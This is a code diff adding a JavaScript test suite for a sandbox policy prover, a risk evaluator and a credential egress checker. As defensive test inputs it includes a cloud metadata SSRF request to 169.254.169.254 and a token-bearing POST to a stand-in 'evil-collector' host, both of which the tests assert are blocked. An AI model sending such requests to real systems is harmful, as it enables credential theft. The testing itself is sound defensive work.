@@ -236,3 +236,104 @@ describe('Strands Box & Dogwood Policy Diode', () => {
   });
 });
 
+describe('NVIDIA OpenShell Policy Prover, Advisor & Endpoint-Bound Credential Providers', () => {
+  const {
+    provePolicyBoundary,
+    evaluateProposalRisk,
+    verifyProviderCredentialEgress,
+  } = require('../src/openshell-lovable-engine');
+
+  test('provePolicyBoundary verifies subset policies and catches write, root, landlock, and REST escalations', () => {
+    const boundary = {
+      version: 1,
+      landlock: { compatibility: 'hard_requirement' },
+      process_policy: { run_as_user: 'sandbox', run_as_group: 'sandbox' },
+      filesystem_policy: { read_only: ['/usr', '/etc'], read_write: ['/workspace'] },
+      network_policies: [{
+        name: 'github_docs',
+        binaries: [{ path: '/usr/bin/gh' }],
+        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'GET', path: '/repos/IgorGanapolsky/**' } }] }],
+      }],
+    };
+    const validSubagent = {
+      version: 1,
+      landlock: { compatibility: 'hard_requirement' },
+      process_policy: { run_as_user: 'sandbox', run_as_group: 'sandbox' },
+      filesystem_policy: { read_only: ['/usr'], read_write: ['/workspace'] },
+      network_policies: [{
+        name: 'github_docs_narrow',
+        binaries: [{ path: '/usr/bin/gh' }],
+        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'GET', path: '/repos/IgorGanapolsky/ThumbGate/contents' } }] }],
+      }],
+    };
+    const okRes = provePolicyBoundary(validSubagent, boundary);
+    assert.equal(okRes.result, 'within_boundary');
+    assert.equal(okRes.exitCode, 0);
+    assert.equal(okRes.passed, true);
+    assert.equal(provePolicyBoundary({ ...validSubagent, filesystem_policy: { read_only: ['/usr'], read_write: ['/tmp'] } }, boundary).reason_code, 'symlink_subpath_unverifiable');
+    const writeRo = provePolicyBoundary({ ...validSubagent, filesystem_policy: { read_only: [], read_write: ['/etc'] } }, boundary);
+    assert.equal(writeRo.result, 'exceeds_boundary');
+    assert.equal(writeRo.counterexample, 'filesystem write /etc');
+    assert.equal(provePolicyBoundary({ ...validSubagent, process_policy: { run_as_user: 'root', run_as_group: 'sandbox' } }, boundary).counterexample, 'process run_as_user root');
+    const deleteEscalation = provePolicyBoundary({
+      ...validSubagent,
+      network_policies: [{ name: 'bad_rest', binaries: [{ path: '/usr/bin/gh' }], endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', enforcement: 'enforce', rules: [{ allow: { method: 'DELETE', path: '/repos/IgorGanapolsky/ThumbGate' } }] }] }],
+    }, boundary);
+    assert.equal(deleteEscalation.counterexample, 'network rest DELETE api.github.com:443/repos/IgorGanapolsky/ThumbGate');
+    assert.equal(provePolicyBoundary({ ...validSubagent, network_policies: [{ name: 'g', endpoints: [{ host: 'api.github.com', port: 443, protocol: 'graphql' }] }] }, boundary).exitCode, 3);
+  });
+
+  test('evaluateProposalRisk blocks metadata SSRF, L7 credential bypass, and capability expansion while auto-approving safe public endpoints', () => {
+    const currentPolicy = {
+      network_policies: [{
+        endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/repos/**' } }] }],
+      }],
+    };
+    const providers = [{ name: 'github', endpoints: [{ host: 'api.github.com', port: 443 }] }];
+
+    const metadataAttack = evaluateProposalRisk(currentPolicy, {
+      endpoints: [{ host: '169.254.169.254', port: 80, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/latest/meta-data' } }] }],
+      binaries: [{ path: '/usr/bin/curl' }],
+    }, { providers, approvalMode: 'auto' });
+    assert.equal(metadataAttack.neverApprovable, true);
+    assert.ok(metadataAttack.findings.includes('link_local_reach'));
+
+    const l7BypassAndPut = evaluateProposalRisk(currentPolicy, {
+      endpoints: [{ host: 'api.github.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'PUT', path: '/repos/org/docs' } }] }],
+      binaries: [{ path: '/usr/bin/git' }],
+    }, { providers, approvalMode: 'auto' });
+    assert.equal(l7BypassAndPut.autoApproved, false);
+    assert.ok(l7BypassAndPut.findings.includes('l7_bypass_credentialed'));
+    assert.ok(l7BypassAndPut.findings.includes('capability_expansion'));
+
+    const safePublicDocs = evaluateProposalRisk(currentPolicy, {
+      endpoints: [{ host: 'docs.nvidia.com', port: 443, protocol: 'rest', rules: [{ allow: { method: 'GET', path: '/openshell/**' } }] }],
+      binaries: [{ path: '/usr/bin/curl' }],
+    }, { providers, approvalMode: 'auto' });
+    assert.equal(safePublicDocs.autoApproved, true);
+    assert.equal(safePublicDocs.status, 'auto_approved');
+  });
+
+  test('verifyProviderCredentialEgress enforces endpoint-bound credential placeholders', () => {
+    const providers = [{
+      name: 'my-github',
+      endpoints: [{ host: 'api.github.com', port: 443, methods: ['GET', 'POST'], pathPrefix: '/repos/IgorGanapolsky/' }],
+    }];
+    const okReq = verifyProviderCredentialEgress({
+      url: 'https://api.github.com/repos/IgorGanapolsky/ThumbGate/issues',
+      method: 'GET',
+      headers: { Authorization: 'Bearer tg_cred://my-github/GITHUB_TOKEN' },
+    }, providers);
+    assert.equal(okReq.allowed, true);
+    assert.equal(okReq.injected, true);
+
+    const exfilReq = verifyProviderCredentialEgress({
+      url: 'https://evil-collector.example.com/steal',
+      method: 'POST',
+      headers: { Authorization: 'Bearer tg_cred://my-github/GITHUB_TOKEN' },
+    }, providers);
+    assert.equal(exfilReq.allowed, false);
+    assert.equal(exfilReq.reason, 'credential_destination_mismatch');
+  });
+});
+
